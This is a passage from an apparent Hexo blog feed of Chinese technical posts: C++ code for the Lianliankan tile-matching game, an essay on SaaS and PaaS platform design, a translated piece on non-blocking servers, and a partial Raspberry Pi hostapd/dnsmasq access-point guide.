class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">turn_once</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x1, <span class="hljs-keyword">int</span> y1, <span class="hljs-keyword">int</span> x2, <span class="hljs-keyword">int</span> y2)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (x1 == x2 &amp;&amp; y1 == y2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> c_x = x1, c_y = y2;</span><br><span class="line">    <span class="hljs-keyword">int</span> d_x = x2, d_y = y1;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> ret = <span class="hljs-literal">false</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (!isBlocked(c_x, c_y))</span><br><span class="line">    &#123;</span><br><span class="line">        ret |= horizon(x1, y1, c_x, c_y) &amp;&amp; vertical(c_x, c_y, x2, y2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!isBlocked(d_x, d_y))</span><br><span class="line">    &#123;</span><br><span class="line">        ret |= horizon(x1, y1, d_x, d_y) &amp;&amp; vertical(d_x, d_y, x2, y2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两个拐角检测"><a href="#两个拐角检测" class="headerlink" title="两个拐角检测"></a>两个拐角检测</h2><p>两个拐角检测可分解为一个拐角检测和水平检测或垂直检测。即：</p><p>两个拐角检测 = 一个拐角检测 &amp;&amp; (水平检测 || 垂直检测)</p><img src="/hexo-blog/20150721/连连看游戏消除算法/4.png"><p>如图，水平、垂直分别穿过 A B 共有四条直线，扫描直线上所有不包含 A B 的点，看是否存在一点 C ，满足以下任意一项：</p><ol><li><p>A 点至 C 点通过水平或垂直检测，C 点至 B 点可通过一个拐角连接。（图中用 C 表示）</p></li><li><p>A 点至 C 点可通过一个拐角连接，C 点至 B 点通过水平或垂直连接。（图中用 C 下划线表示）</p></li></ol><p>代码如下：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">turn_twice</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x1, <span class="hljs-keyword">int</span> y1, <span class="hljs-keyword">int</span> x2, <span class="hljs-keyword">int</span> y2)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (x1 == x2 &amp;&amp; y1 == y2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= MAX_X; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= MAX_Y; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (i != x1 &amp;&amp; i != x2 &amp;&amp; j != y1 &amp;&amp; j != y2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> ((i == x1 &amp;&amp; j == y1) || (i == x2 &amp;&amp; j == y2))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (isBlocked(i, j))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (turn_once(x1, y1, i, j) &amp;&amp; (horizon(i, j, x2, y2) || vertical(i, j, x2, y2)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">if</span> (turn_once(i, j, x2, y2) &amp;&amp; (horizon(x1, y1, i, j) || vertical(x1, y1, i, j)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><p>最后，整合以上四种情况，判断两点是否能消除的代码可以写成：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x1, <span class="hljs-keyword">int</span> y1, <span class="hljs-keyword">int</span> x2, <span class="hljs-keyword">int</span> y2)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">int</span> ret = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">    ret = horizon(x1, y1, x2, y2);</span><br><span class="line">    <span class="hljs-keyword">if</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = vertical(x1, y1, x2, y2);</span><br><span class="line">    <span class="hljs-keyword">if</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = turn_once(x1, y1, x2, y2);</span><br><span class="line">    <span class="hljs-keyword">if</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = turn_twice(x1, y1, x2, y2);</span><br><span class="line">    <span class="hljs-keyword">if</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 连连看 </tag>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云平台之 SaaS 随想</title>
      <link href="/hexo-blog/20150503/%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B9%8B-SaaS-%E9%9A%8F%E6%83%B3/"/>
      <url>/hexo-blog/20150503/%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B9%8B-SaaS-%E9%9A%8F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="http://88250.b3log.org/saas-essay" target="_blank" rel="noopener">http://88250.b3log.org/saas-essay</a></p></blockquote><h2 id="SaaS-平台"><a href="#SaaS-平台" class="headerlink" title="SaaS 平台"></a>SaaS 平台</h2><h3 id="以应用为中心"><a href="#以应用为中心" class="headerlink" title="以应用为中心"></a>以应用为中心</h3><p>“平台”本来就比较泛，再加上“SaaS”的话就更飘渺了。</p><p>我们先从一个简单的场景来看：</p><ol><li>开发者开发应用后在市场上线</li><li>用户购买应用使用</li><li>开发者通过市场反馈调整运维，为后续版本计划提供依据</li><li>新版本上线，用户升级使用</li></ol><p>这是以应用为中心的一个闭环（市场-开发-运维-市场），实现了应用的整个生命周期，我们可以把平台看成是这个场景的支撑，场景中的所有活动都是在平台上完成的，整个场景就是一个 SaaS 生态系统。</p><a id="more"></a><h3 id="组成元素"><a href="#组成元素" class="headerlink" title="组成元素"></a>组成元素</h3><p>在这个 SaaS 生态系统中，我们可以简单总结出以下几个必须的组成元素：</p><ul><li>开发者：个人/组织，要做的事情是开发应用、运维应用</li><li>运行环境：应用程序实际运行的环境，要解决的是如何接入/部署应用</li><li>运维控制：应用运行情况监控，要解决的是动态监控</li><li>用户：使用应用的个人/组织，要做的事情是（购买）使用应用</li><li>社区：开发者社区、用户社区，供开发者/用户进行分享、反馈</li><li>应用市场：应用上架展示，供开发者应用上线，用户（购买）使用</li></ul><p>按参与者角色（开发者、平台、用户）把这几个组成元素分类后，SaaS 平台部分包括了：运行环境、运维控制、社区、应用市场。这里的“平台”是个广义概念，是多个具体平台的综合。例如“Android 平台”，包括了开发平台、应用市场、硬件平台、开发者社区等。</p><h3 id="面向应用用户"><a href="#面向应用用户" class="headerlink" title="面向应用用户"></a>面向应用用户</h3><p>如果把 SaaS 应用比作是一个游戏，那么，</p><ul><li>SaaS 平台制订了基本的游戏规则，并提供了游戏道具</li><li>开发者制订了游戏的细节规则，形成游戏玩法</li><li>用户选择游戏，玩游戏</li></ul><p>最终，用户的体验是该游戏是否好玩，这是由平台和开发者共同决定的。也就是说，SaaS 平台和开发者是利益共同体，并且<strong>平台的基本规则决定了游戏的质量的起点</strong>。</p><h3 id="PaaS-与-SaaS"><a href="#PaaS-与-SaaS" class="headerlink" title="PaaS 与 SaaS"></a>PaaS 与 SaaS</h3><ul><li>从用户角度看：PaaS 面向的是开发者用户，SaaS 面向的是应用用户</li><li>从应用角度看：PaaS 侧重应用的 Runtime，SaaS 侧重应用的接入与集成</li><li>PaaS 不关注应用业务领域，SaaS 则是某业务领域</li><li>PaaS 成功与否看的是开发者的反馈，SaaS 成功与否是应用用户的反馈</li></ul><p>另外，SaaS 不是必然包含 PaaS。开发者在选定了 SaaS 后应该也可以选择 PaaS。但这个方式需要开发者熟悉多种平台，提高了运维的难度。</p><h2 id="应用引擎"><a href="#应用引擎" class="headerlink" title="应用引擎"></a>应用引擎</h2><p>应用引擎（App Engine）是目前业界实现 PaaS 的主流方式。它<strong>至少</strong>需要为开发者提供以下几个功能：</p><ul><li>部署：上传部署包部署</li><li>实例管理：启停实例</li><li>日志：查看日志，分实例</li></ul><p>内部<strong>至少</strong>需要实现以下几个功能：</p><ul><li>请求路由：请求分发到应用进程实例</li><li>状态采集：基础设施、实例状态采集</li><li>应用隔离：应用之间不能相互影响</li><li>实例管理：按需启停</li><li>资源控制：应用对资源的使用是受控的</li><li>耗用统计：API 调用次数、IO/存储大小</li><li>配额模型：量化应用对资源的使用</li></ul><p>目前我们熟悉的几个 XAE 都是这样做的，并且从传统的沙箱模型（API 受控）迁移到基于 LXC 的容器（Docker）已经是趋势，因为这样对应用开发的限制更小，开发者更容易接受。</p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>目前业界主流的 PaaS 中都提供了基础服务，这些服务都是属于技术服务：</p><ul><li>缓存</li><li>消息队列</li><li>消息推送</li><li>文件存储</li><li>定时任务</li><li>…</li></ul><p>这一块相对比较固定，调用方式一般都是基于 SDK API，有的也有 RESTful 接口。</p><h3 id="部署包"><a href="#部署包" class="headerlink" title="部署包"></a>部署包</h3><p>以 Java 为例，部署包一般都是 war 包，但除了满足标准 war 结构外，还需要加入一些平台特定的配置规则。比如通过配置文件描述 appid（或是通过 war 包名），用于部署时对应到平台上的应用配置。也就是说所有的应用配置都是可以做成非包内配置文件的，好比应用上某些地方需要抉择使用数据库或配置文件，这是平台设计时需要仔细考虑的。</p><h2 id="应用集成"><a href="#应用集成" class="headerlink" title="应用集成"></a>应用集成</h2><p>应用集成主要是针对 SaaS 而言，用户选择多个应用后可以在一个视图中使用它们，这些应用之间也可能存在调用交互。</p><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>最简单的视图集成方式就是通过导航（图标），用户安装了某应用后，该应用图标就出现在这个用户的“首页”视图中。由平台给出集成规则，应用开发时遵循这些规则就可以集成进来。</p><p>对于平台来说，这一块很有难度，或者说很难把握：</p><ul><li>如果集成规则太复杂，那会对开发者造成很多困扰和不便，但对用户来说就更透明、无缝，用户体验会更好</li><li>如果集成规则太简单，那对开发者约束较低，但集成度也更低，用户体验可能很难提升</li></ul><p>目前业界的大多数 SaaS 在做这一块时都选择了简单的集成方式：接入图标，用户使用时点击图标并跳转到对应的应用。深度的集成（样式、交互模式统一）的方式很少见（互联网 SaaS 基本不可行，除非已经是业界标准）。</p><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>服务端的调用也存在集成，应用之间互调也是 SaaS 需要考虑的场景。这部分可选的做法是 SaaS 提供 RPC 协议实现，这样应用间可以通过统一的调用协议进行互调。当然，也可以通过 HTTP 来实现，这样限制更少一些，但平台对应用的管控也会更弱。</p><h2 id="多租户"><a href="#多租户" class="headerlink" title="多租户"></a>多租户</h2><p>多租户支持主要目的是简化应用开发，让应用可以全心全意关注业务逻辑而不是关注租户相关逻辑，具体细节请参考 <a href="http://88250.b3log.org/cloud-app-platform-multitenancy" target="_blank" rel="noopener">这里</a>。</p><h2 id="开放平台"><a href="#开放平台" class="headerlink" title="开放平台"></a>开放平台</h2><p>前面我们提到过 SaaS 应该是可以接入其他 PaaS 应用的，这类应用我们可以认为是“外部应用”。既然是外部应用，那肯定是需要特定的接入规则，可以考虑参考行业标准规范。</p><h3 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h3><p>通过该协议，SaaS 可以将服务（甚至是一些应用）暴露为 RESTful 接口给外部应用使用，这样可以充分利用平台的资源，吸引更多的应用进入到 SaaS 这个生态系统中。</p><h2 id="分润"><a href="#分润" class="headerlink" title="分润"></a>分润</h2><p>最终买单的是用户，SaaS 平台和开发者是利益共同体，所以平台在指定规则时需要考虑好与开发者的分润。对于部署在 SaaS 内的应用和外部应用，分润规则应该是不一样的。下面是两种简单的方式：</p><ul><li>内部应用：通过平台提供的支付接口进行分润，应用好卖，平台跟着受益</li><li>外部应用：应用支付给平台配额耗用费用，应用固定支付给平台其资源使用费用</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SaaS 需要从至少两方面进行设计：基于特定的 PaaS；可以接入外部应用。自下而上、自上而下，包罗万象、井井有条。</p><p><strong>平台最终比拼的是应用资源</strong>，而不是平台本身，尽可能吸引开发者是很重要的成功前提。要做到这一点，我们需要：</p><ul><li>垂直领域（例如协同办公）</li><li>降低开发门槛（减少配置，轻量化 SDK）</li><li>概念具象化（例如多租户）</li><li>实现采用业界主流技术（Golang/Docker）</li><li>支持多种编程语言</li><li>活跃开发者社区</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Golang </tag>
            
            <tag> Docker </tag>
            
            <tag> PaaS </tag>
            
            <tag> SaaS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非阻塞服务器需要注意的主要问题</title>
      <link href="/hexo-blog/20150429/%E9%9D%9E%E9%98%BB%E5%A1%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98/"/>
      <url>/hexo-blog/20150429/%E9%9D%9E%E9%98%BB%E5%A1%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文：<a href="http://amix.dk/blog/post/19581#The-main-issue-with-non-blocking-servers" target="_blank" rel="noopener">http://amix.dk/blog/post/19581#The-main-issue-with-non-blocking-servers</a><br>译文：<a href="http://blog.csdn.net/chong232/article/details/6153161" target="_blank" rel="noopener">http://blog.csdn.net/chong232/article/details/6153161</a></p></blockquote><p>非阻塞服务器有一个严重的问题，一些人甚至在没解决这个问题的背景下就开发自己的应用框架（比如 Python 的 <a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="noopener">Tornado</a>）</p><p>当你使用非阻塞服务器的时候，你会获得出色的性能并且不需要担心可扩展性，然而同时你需要意识到一个问题：你的IO调用、网络系统调用也都是非阻塞的吗？很多人忽略了，他们使用的非阻塞服务器，其实是构建在阻塞库之上的。</p><p>在这篇文章里，我将深入对比多线程的服务器与非阻塞的服务器分别是如何工作的，以及你之所以需要在”使用的服务器”与”使用的库”在阻塞模式上保持一致的原因。</p><a id="more"></a><h2 id="Non-blocking-servers-perform-better"><a href="#Non-blocking-servers-perform-better" class="headerlink" title="Non-blocking servers perform better"></a>Non-blocking servers perform better</h2><p>首先，我不会否认非阻塞服务器比阻塞服务器有更好的性能，尤其在那些有着数以万计的高并发用户的应用场景中。下面通过一些图片对说明这个问题，这些图片是WebFaction所测试的结果：</p><ul><li><a href="http://blog.webfaction.com/a-little-holiday-present" target="_blank" rel="noopener">A little holiday present: 10,000 reqs/sec with Nginx!</a></li></ul><p>当他们从 <a href="http://httpd.apache.org/" target="_blank" rel="noopener">Apache</a> 向 <a href="http://nginx.org/" target="_blank" rel="noopener">Nginx</a> 迁移时，发现：</p><p>Nginx每秒可以处理更多的请求：</p><img src="/hexo-blog/20150429/非阻塞服务器需要注意的主要问题/req_pr_sec.png"><p>Nginx比Apache使用更少的内存：</p><img src="/hexo-blog/20150429/非阻塞服务器需要注意的主要问题/memory_usage.png"><p>真是令人吃惊的结果，那么为何不把非阻塞技术引入到你的 Python/Java/Ruby/PHP 框架里呢？</p><h2 id="How-blocking-servers-work"><a href="#How-blocking-servers-work" class="headerlink" title="How blocking servers work"></a>How blocking servers work</h2><p>阻塞式服务器通常是基于多线程的，一个线程处理一个请求，它的工作方式可以现象化地表示为：</p><img src="/hexo-blog/20150429/非阻塞服务器需要注意的主要问题/threaded_server.png"><p>关于阻塞式服务器，有如下事实：</p><ul><li>处理高并发连接请求代价昂贵，服务器需要量产线程——线程并不便宜。</li><li>库函数需要线程安全，这是多线程环境必需的。</li></ul><h2 id="How-non-blocking-servers-work"><a href="#How-non-blocking-servers-work" class="headerlink" title="How non-blocking servers work"></a>How non-blocking servers work</h2><p>非阻塞服务器不需要多线程，它通过一个IO循环及(异步)事件来处理请求，它的工作方式如下：</p><img src="/hexo-blog/20150429/非阻塞服务器需要注意的主要问题/non_blocking_server.png"><p>关于非阻塞式服务器，有如下事实：</p><ul><li>处理高并发连接请求不是困难，这也是它被用于comet技术的重要原因</li><li>在IO循环中的所有操作都必须是非阻塞，否则会因为你一个操作而阻断了整个循环</li><li>不需要线程安全</li></ul><h2 id="Where-Tornado-and-others-go-wrong"><a href="#Where-Tornado-and-others-go-wrong" class="headerlink" title="Where Tornado (and others) go wrong"></a>Where Tornado (and others) go wrong</h2><p>我以Tornado为例，但是其它的非阻塞式应用存在相同的问题。</p><p>Tornado使用了非阻塞式的服务器，但他们同时使用的库是阻塞式的，于是：</p><ul><li>Tornado关于Mysql连接的库是阻塞的，这意味如果你的查询需要1s，那么你的loop循环就需要停下来1s等待查询的完成</li><li>不要使用昂贵的系统调用，它会卡住整个循环</li><li>同样，不要在循环中渲染模板，原因同上</li></ul><p>就像我之前提过的，阻塞整个loop是致命的，因为此时你什么也做不了！</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>总之，非阻塞技术精巧且性能卓越，但要正确运用此技术，你必须使用同样是阻塞式的IO和Network调用，否则你将后患无穷！还有，请注意Python, Ruby, Java or PHP等这些语言缺省都是阻塞式的，所以当你同时使用非阻塞的服务器和这些语言其中之一的话，请务必当心！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 转载 </tag>
            
            <tag> Tornado </tag>
            
            <tag> 非阻塞 </tag>
            
            <tag> NIO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派配置 AP，变身无线路由器</title>
      <link href="/hexo-blog/20150426/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%20AP%EF%BC%8C%E5%8F%98%E8%BA%AB%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
      <url>/hexo-blog/20150426/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%20AP%EF%BC%8C%E5%8F%98%E8%BA%AB%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>首先介绍一下系统环境，笔者用的是树莓派2B (Raspberry Pi 2 Model B)系统是 <a href="https://www.archlinux.org/" target="_blank" rel="noopener">Arch Linux</a>。另外购得了一个无线网卡，<a href="http://www.tenda.com.cn/product/W311M.html" target="_blank" rel="noopener">Tenda W311M</a>，RT5370 芯片，支持 Soft-AP。无线网卡是否支持 AP，这点大家购买前一定要确认一下。</p><p>大家知道，配置无线 AP 有很多种方法，本文使用 hostapd + dnsmasq 进行配置，如果你不太习惯这两个工具，也可以使用其他方案。</p><a id="more"></a><h2 id="确认无线网卡支持-AP-模式"><a href="#确认无线网卡支持-AP-模式" class="headerlink" title="确认无线网卡支持 AP 模式"></a>确认无线网卡支持 AP 模式</h2><ol><li><p>执行 <code>lsusb</code> 查看接入的 USB 信息。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bus 001 Device 004: ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless Adapter</span><br><span class="line">Bus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet Adapter</span><br><span class="line">Bus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 Hub</span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br></pre></td></tr></table></figure><p>可以看到第一行便是笔者的无线网卡。</p></li><li><p>执行 <code>iw list</code> 查看无线网卡支持的模式。（如果没有请使用 pacman 安装）</p><p>请注意 <code>supported interface modes</code> 这一项：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">software interface modes (can always be added):</span><br><span class="line">    * IBSS</span><br><span class="line">    * managed</span><br><span class="line">    * AP</span><br><span class="line">    * AP/VLAN</span><br><span class="line">    * monitor</span><br></pre></td></tr></table></figure><p>如果包含 <code>AP</code> 则说明是网卡是支持的，可以继续下一步，否则说明网卡硬件不支持或者驱动不支持。</p><p>如果硬件不支持那就没有办法，如果只是驱动不支持可以 Google 相关的驱动，再此就不赘述了。<sup><a href="http://www.361way.com/hostapd-soft-ap/2933.html" target="_blank" rel="noopener">[1]</a></sup> <sup><a href="https://wiki.archlinux.org/index.php/Software_access_point" target="_blank" rel="noopener">[2]</a></sup></p></li></ol><h2 id="配置无线热点"><a href="#配置无线热点" class="headerlink" title="配置无线热点"></a>配置无线热点</h2><ol><li><p>安装 hostapd</p></li><li><p>修改（新建） <code>hostapd.conf</code></p><p><code>vim /etc/hostapd/hostapd.conf</code>，检查以下配置项：</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 无线网卡名称，这里应该与无线网卡对应</span></span><br><span class="line"><span class="hljs-attr">interface</span>=wlan0</span><br><span class="line"><span class="hljs-attr">driver</span>=nl80211</span><br><span class="line"><span class="hljs-comment"># WIFI 名称</span></span><br><span class="line"><span class="hljs-attr">ssid</span>=YourWiFiName</span><br><span class="line"><span class="hljs-comment"># 模式：a/b/g</span></span><br><span class="line"><span class="hljs-attr">hw_mode</span>=g</span><br><span class="line"><span class="hljs-comment"># 信道</span></span><br><span class="line"><span class="hljs-attr">channel</span>=<span class="hljs-number">6</span></span><br><span class="line"><span class="hljs-attr">macaddr_acl</span>=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attr">auth_algs</span>=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attr">ignore_broadcast_ssid</span>=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attr">wpa</span>=<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-comment"># WIFI 密码</span></span><br><span class="line"><span class="hljs-attr">wpa_passphrase</span>=Somepassphrase</span><br><span class="line"><span class="hljs-attr">wpa_key_mgmt</span>=WPA-PSK</span><br><span class="line"><span class="hljs-attr">wpa_pairwise</span>=TKIP</span><br><span class="line"><span class="hljs-attr">rsn_pairwise</span>=CCMP</span><br><span class="line"><span class="hljs-comment"># 最大支持的 station 数量</span></span><br><span class="line"><span class="hljs-attr">max_num_sta</span>=<span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-attr">logger_stdout</span>=-<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attr">logger_stdout_level</span>=<span class="hljs-number">2</span></span><br></pre></td></tr></table></figure></li><li><p>启动</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start hostapd</span><br></pre></td></tr></table></figure></li></ol><h2 id="配置-DNS-和-DHCP-服务器"><a href="#配置-DNS-和-DHCP-服务器" class="headerlink" title="配置 DNS 和 DHCP 服务器"></a>配置 DNS 和 DHCP 服务器</h2><ol><li><p>为无线网卡配置 IP 地址</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan 192.168.0.1/24</span><br></pre></td></tr></table></figure><p>也可以使用</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link <span class="hljs-built_in">set</span> up dev wlan0</span><br><span class="line">ip addr add 192.168.0.1/24 dev wlan0</span><br></pre></td></tr></table></figure></li><li><p>修改 <code>dnsmasq.conf</code></p><p><code>vim /etc/dnsmasq.conf</code>，检查以下几项：</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># dnsmasq 的 dns 配置</span></span><br><span class="line"><span class="hljs-attr">resolv-file</span>=/etc/resolv.dnsmasq.conf</span><br><span class="line"><span class="hljs-comment"># 无线网卡设备名</span></span><br><span class="line"><span class="hljs-attr">interface</span>=wlan0</span><br><span class="line"><span 